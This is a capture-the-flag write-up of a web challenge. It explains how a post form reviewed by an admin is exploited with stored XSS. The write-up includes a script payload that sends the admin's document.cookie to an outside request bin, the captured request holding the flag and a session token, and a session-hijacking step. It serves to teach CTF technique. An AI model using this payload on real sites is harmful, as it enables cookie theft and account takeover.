Government Agriculture Network (**web**)


    Well it seems someone can't keep their work life and their home 
    life separate. You vaguely recall on your home planet, posters put 
    up everywhere that said "Loose Zips sink large commercial 
    properties with a responsibility to the shareholders." You wonder 
    if there is a similar concept here.

    Using the credentials to access this so-called Agricultural 
    network, you realize that SarahH was just hired as a vendor or 
    contract worker and given access that was equivalent. You can only 
    assume that Vendor/Contractor is the highest possible rank bestowed 
    upon only the most revered and well regarded individuals of the 
    land and expect information and access to flow like the Xenovian 
    acid streams you used to bathe in as a child.

    The portal picture displays that small very attractive individual 
    whom you instantly form a bond with, despite not knowing. You must 
    meet this entity! Converse and convince them you're meant to be! 
    After a brief amount of time the picture shifts into a biped 
    presumably ingesting this creature! HOW DARE THEY. You have to save 
    them, you have to stop this from happening. Get more information 
    about this Gubberment thing and stop this atrocity.

    You need to get in closer to save them - you beat on the window, 
    but you need access to the cauliflower's host to rescue it.


URL is given: https://govagriculture.web.ctfcompetition.com/

Opening it in browser shows us a simple web form with text field and 
`Submit` button, quick glance to web page source HTML tells us that 
there are nothing special.
Trying to post something leads to the message:

    Your post was submitted for review. Administator will take a look shortly. 

Well, if *administrator* will open and look on every owr post, then it 
is Cross-Site-Scripting (XSS) problem for sure, and all what we need is 
to send some specially crafted message that will do some useful thing 
being *looked* (*opened* in web browser) by Administrator. Basically it 
is a text that contains javascript. This javascript will be executed by 
Administrator's browser and hence have access to some interesting data 
like cookies. For example, we can enforce Administrator's browser to 
try to load image from other site and embed in URL value of 
`document.cookie`. There will be no image at that URL, but it will too 
late, the request with data already will be captured.
But how can we see this request? One way is to open listening tcp 
socket (`nc -l 12345`) and crafting URL to fake image like 
`"http://<our-external-ip>:12345/img.png?cookie="+document.cookie` and 
see the request in terminal. But what if we have no external IP, or 
have connection via uncontrolled strict firewall or just do not want to 
open our port for incoming connections?
There is good web service for this situation that I saw on other's 
write-ups: [PostBin](https://postb.in). It is free and extremely easy 
to use. Register some "bin" and look for requests to it.

Ok, back to CTF, let's try simpliest thing, probably copy-pasted from 
Wikipedia or first page Googled for "XSS examples":

    <script>
    var img=new Image();
    img.src="https://postb.in/1561479835927-8693528019357?cookie="+document.cookie;
    </script>

Yes, here it is:

    Bin '1561479835927-8693528019357'

    [Req '1561480065527-6931422839406' : 104.155.55.51]
    GET /1561479835927-8693528019357 2019-06-25T16:27:45.527Z
    Headers

        x-real-ip: 104.155.55.51
        host: postb.in
        connection: close
        pragma: no-cache
        cache-control: no-cache
        sec-fetch-mode: no-cors
        user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/77.0.3827.0 Safari/537.36
        accept: image/webp,image/apng,image/*,*/*;q=0.8
        sec-fetch-site: cross-site
        referer: https://govagriculture.web.ctfcompetition.com/pwn?msg=%3Cscript%3E%0D%0Avar+img%3Dnew+Image%28%29%3B%0D%0Aimg.src%3D%22https%3A%2F%2Fpostb.in%2F1561479835927-8693528019357%3Fcookie%3D%22%2Bdocument.cookie%3B%0D%0A%3C%2Fscript%3E
        accept-encoding: gzip, deflate, br

    Query

        cookie: flag=CTF{8aaa2f34b392b415601804c2f5f0f24e}; session=HWSuwX8784CmkQC1Vv0BXETjyXMtNQrV

    Body
    
    
And the flag is

**CTF{8aaa2f34b392b415601804c2f5f0f24e}**

What if we take Admin's session key? It can be done in different ways 
depending on your browser. For me the simpliest thing was to open 
Firefox's WebConsole and just write to it:

    document.cookie="session=HWSuwX8784CmkQC1Vv0BXETjyXMtNQrV"

Then click to the link "Admin".
Nothing interesting, just the same flag in plain text. But at least 
we tried...
